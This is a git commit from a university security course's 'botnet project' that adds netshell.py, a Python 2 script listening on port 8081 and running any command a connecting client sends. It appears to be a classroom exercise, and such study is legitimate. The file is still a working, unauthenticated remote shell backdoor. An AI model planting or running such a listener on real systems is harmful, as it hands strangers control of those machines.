b2b91fef85783d45bda0d846aa0a6c456394afd6
Kyle <healykys@gmail.com>
2019-02-11 18:01:46 -0600

    Adding netshell for botnet project on week 4

---
+++ week04/netshell.py
@@ -0,0 +1,57 @@
+#!/usr/bin/python2
+
+# Additions by Kyle Healy for CPSC62700
+# Due: 2/13/2019
+
+import socket, subprocess, select
+
+# create the listener socket
+listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+listener.bind(('',8081))
+
+
+# start listening
+listener.listen(10)
+
+# create the list of all sockets
+allsocks = [listener]
+
+# the main service loop
+while True:
+    # use select to see if any sockets are ready
+    ready, output, exceptions = select.select(allsocks,[], [])
+    for sock in ready:
+        # if its the listener, accept a new client connection
+        if sock == listener:
+            conn, addr = sock.accept()
+            print "New connection from", addr
+            allsocks.append(conn)
+        # otherwise, its a command ot execute from a previously established client
+        else:
+            commstr = sock.recv(1024) #max size
+            if commstr: #if it's not empty
+                # split the string into the command and args
+                commlist = commstr.rstrip().split(" ")
+                print "Executing command: \n", commlist
+                if commlist and commlist[0].lower()=='exit':
+                    #special case for exit
+                    sock.close()
+                    allsocks.remove(sock)
+                else:
+                    # run the command with exception handling
+                    try:
+                        p1 = subprocess.Popen(commlist, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                        out, err = p1.communicate()
+                    except:
+                        out = "Command failed\n"
+                        sock.send(out)
+                        #allsocks.remove(sock)
+                    else:
+                        if err:
+                            sock.send(err)
+                        #command is finished, send output to client
+                        sock.send(out)
+
+#this code will actually never be reached.
+listener.close()
+
